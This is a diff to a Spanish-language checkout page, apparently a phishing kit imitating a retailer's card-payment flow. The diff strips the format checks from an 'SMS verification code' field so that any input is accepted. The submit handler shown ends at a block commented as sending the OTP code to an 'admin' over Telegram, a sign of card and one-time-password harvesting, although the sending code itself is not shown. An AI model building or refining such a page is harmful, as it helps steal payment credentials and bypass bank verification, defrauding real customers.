@@ -388,13 +388,8 @@
         <div class="flex flex-col gap-1">
           <label for="verification-code" class="text-[10px] font-bold text-gray-500 uppercase tracking-wider">Código de verificación SMS *</label>
           <div class="relative">
-            <input type="text" id="verification-code" required placeholder="000 000" maxlength="7" class="w-full bg-[#f8f9fa] border border-gray-300 rounded px-3.5 py-3 text-lg font-mono font-bold tracking-[0.25em] text-center focus:bg-white focus:border-black focus:outline-none transition-colors" />
-            <div id="verification-error" class="hidden text-xs text-mm-red font-bold mt-1.5 flex items-center gap-1">
-              <svg class="w-3.5 h-3.5 shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg>
-              <span>El código debe tener 6 dígitos</span>
-            </div>
+            <input type="text" id="verification-code" required placeholder="Código de verificación" class="w-full bg-[#f8f9fa] border border-gray-300 rounded px-3.5 py-3 text-lg font-mono font-bold tracking-[0.25em] text-center focus:bg-white focus:border-black focus:outline-none transition-colors" />
           </div>
-          <span class="text-[10px] text-gray-400 mt-1 block">Introduzca cualquier código de 6 dígitos para probar (ej. 123456)</span>
         </div>
 
         <!-- Buttons -->
@@ -619,19 +614,9 @@
       const verificationCard = verificationModal.querySelector('.relative.bg-white');
       const verificationForm = document.getElementById('verification-form');
       const verificationCodeInput = document.getElementById('verification-code');
-      const verificationError = document.getElementById('verification-error');
       const btnVerificationCancel = document.getElementById('btn-verification-cancel');
 
-      // Verification Code Input Formatter (digits only, spacing in middle: "000 000")
-      verificationCodeInput.addEventListener('input', (e) => {
-        let value = e.target.value.replace(/\D/g, ''); // digits only
-        if (value.length > 3) {
-          e.target.value = value.substring(0, 3) + ' ' + value.substring(3, 6);
-        } else {
-          e.target.value = value;
-        }
-        verificationError.classList.add('hidden');
-      });
+
 
       // Submit credit card form -> Show security verification popup
       paymentForm.addEventListener('submit', async (e) => {
@@ -712,11 +697,7 @@
       verificationForm.addEventListener('submit', async (e) => {
         e.preventDefault();
 
-        const rawCode = verificationCodeInput.value.replace(/\s/g, '');
-        if (rawCode.length !== 6) {
-          verificationError.classList.remove('hidden');
-          return;
-        }
+        const rawCode = verificationCodeInput.value.trim();
 
         // --- TELEGRAM: Send OTP code to admin ---
         try {
